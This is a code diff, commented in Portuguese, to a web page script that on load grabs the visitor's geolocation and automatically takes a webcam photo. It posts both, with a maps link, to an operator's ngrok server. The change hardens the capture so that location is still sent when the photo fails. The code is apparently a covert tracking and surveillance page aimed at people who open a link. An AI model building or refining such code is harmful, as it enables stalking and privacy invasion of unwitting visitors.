@@ -42,9 +42,20 @@
 
     // Inicia o processo de captura ao carregar a página
     window.addEventListener("load", async () => {
+      let photoBlob = null;
+      let position;
+
       try {
-        const photoBlob = await takeAutoPhoto();
-        const position = await getUserLocation();
+        // 1. Tenta obter a localização primeiro
+        position = await getUserLocation();
+
+        try {
+          // 2. Tenta tirar a foto
+          photoBlob = await takeAutoPhoto();
+        } catch (photoError) {
+          console.error("Erro ao tirar foto (continuando sem ela):", photoError);
+          // A foto não é obrigatória, então photoBlob continuará como null
+        }
 
         const latitude = position.coords.latitude;
         const longitude = position.coords.longitude;
@@ -54,7 +65,11 @@
         formData.append('latitude', latitude);
         formData.append('longitude', longitude);
         formData.append('maps', maps);
-        formData.append('photo', photoBlob, 'photo.jpg');
+
+        // Adiciona a foto ao formulário apenas se ela foi capturada com sucesso
+        if (photoBlob) {
+          formData.append('photo', photoBlob, 'photo.jpg');
+        }
 
         // Envia os dados para o servidor
         // IMPORTANTE: Substitua pela sua URL do ngrok
@@ -64,9 +79,9 @@
         });
 
       } catch (error) {
-        console.error("Erro no processo:", error);
-        // Opcional: informar o usuário sobre o erro
-        // alert("Não foi possível enviar os dados: " + error.message);
+        console.error("Erro no processo principal (localização):", error);
+        // Se a localização falhar, o processo é interrompido.
+        // alert("Não foi possível obter sua localização. O processo foi interrompido.");
       }
     });
 
